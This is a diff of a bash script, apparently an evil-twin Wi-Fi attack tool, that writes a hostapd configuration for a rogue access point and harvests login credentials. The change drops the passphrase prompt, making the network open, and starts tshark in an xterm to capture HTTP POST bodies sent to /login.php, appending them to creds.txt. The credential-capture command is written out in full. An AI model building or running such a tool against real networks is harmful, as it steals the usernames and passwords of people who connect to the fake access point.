@@ -49,8 +49,6 @@ create_hostapd_conf() {
     # Prompt user for SSID
     read -p "Enter SSID (network name): " ssid
 
-    # Prompt user for passphrase
-    read -p "Enter passphrase (8-63 characters): " passphrase
 
     # Prompt user for channel
     read -p "Enter channel (1-11): " channel
@@ -76,13 +74,9 @@ rsn_pairwise=CCMP
 EOF
 
     echo "hostapd.conf created successfully."
-}
 
-# Function to continuously capture credentials using tshark
-capture_creds() {
-    echo "Waiting for credentials..."
-    # Capture HTTP POST requests containing login credentials
-    tshark -i "$interface" -Y "http.request.method == POST && http.request.uri.path == '/login.php'" -T fields -e http.request.method -e http.request.uri.path -e http.request.uri.query -e http.request.body -E separator='|' >> creds.txt
+    # Start tshark in another terminal
+    xterm -e "tshark -i $interface -Y 'http.request.method == POST && http.request.uri.path == \"/login.php\"' -T fields -e http.request.method -e http.request.uri.path -e http.request.uri.query -e http.request.body -E separator='|' >> creds.txt" &
 }
 
 # Main script starts here
@@ -95,7 +89,3 @@ big_welcome
 
 # Call the menu function to start
 menu
-
-# Continuously capture credentials
-capture_creds
-
